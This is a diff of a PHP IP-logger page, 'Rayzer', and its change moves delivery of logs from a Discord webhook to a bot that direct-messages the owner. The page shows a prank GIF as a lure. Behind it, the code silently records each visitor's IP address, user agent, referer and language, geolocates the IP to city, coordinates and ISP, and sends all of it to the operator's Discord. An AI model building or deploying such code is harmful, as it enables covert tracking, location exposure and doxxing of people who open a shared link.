@@ -1,31 +1,31 @@
 <?php
-// /web/rayzer.php
+// /web/DISCORD_BOT/rayzer.php
 
 // CONFIGURATION
-$WEBHOOK_URL = "PUT YOUR WEBHOOK HERE";
+$BOT_TOKEN = "PUT_BOT_TOKEN_HERE";
+$OWNER_ID = "PUT_OWNER_ID_HERE";
 $GIF_URL = "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif";
 
 $ip = $_SERVER['REMOTE_ADDR'];
 if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
     $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
 }
-$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? "Yok";
-$referer = $_SERVER['HTTP_REFERER'] ?? "Yok";
-$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? "Yok";
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? "None";
+$referer = $_SERVER['HTTP_REFERER'] ?? "None";
+$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? "None";
 
 $geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip?fields=status,country,regionName,city,lat,lon,isp,org,query"), true);
 
 $embed = [
-    "username" => "Rayzer IP Logger",
     "embeds" => [
         [
-            "title" => "New Log (PHP) 🔍",
-            "color" => hexdec("2f3136"),
+            "title" => "New Log (Discord Bot DM) 🔍",
+            "color" => hexdec("5865f2"),
             "fields" => [
                 ["name" => "IP", "value" => "`$ip`", "inline" => true],
                 ["name" => "Location", "value" => ($geo['city'] ?? "?") . ", " . ($geo['regionName'] ?? "?") . ", " . ($geo['country'] ?? "?"), "inline" => true],
                 ["name" => "Cords", "value" => ($geo['lat'] ?? "?") . ", " . ($geo['lon'] ?? "?"), "inline" => true],
-                ["name" => "ISP", "value" => $geo['isp'] ?? "Bilinmiyor", "inline" => false],
+                ["name" => "ISP", "value" => $geo['isp'] ?? "Unknown", "inline" => false],
                 ["name" => "User-Agent", "value" => "```$userAgent```", "inline" => false],
                 ["name" => "Referer", "value" => $referer, "inline" => false],
                 ["name" => "Language", "value" => $lang, "inline" => true]
@@ -36,13 +36,31 @@ $embed = [
     ]
 ];
 
-$ch = curl_init($WEBHOOK_URL);
-curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+$ch = curl_init("https://discord.com/api/v10/users/@me/channels");
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    'Content-Type: application/json',
+    'Authorization: Bot ' . $BOT_TOKEN
+]);
 curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($embed));
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['recipient_id' => $OWNER_ID]));
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_exec($ch);
+$response = curl_exec($ch);
+$dm_data = json_decode($response, true);
 curl_close($ch);
+
+if (isset($dm_data['id'])) {
+    $channel_id = $dm_data['id'];
+    $ch = curl_init("https://discord.com/api/v10/channels/$channel_id/messages");
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Content-Type: application/json',
+        'Authorization: Bot ' . $BOT_TOKEN
+    ]);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($embed));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_exec($ch);
+    curl_close($ch);
+}
 ?>
 <!DOCTYPE html>
 <html>
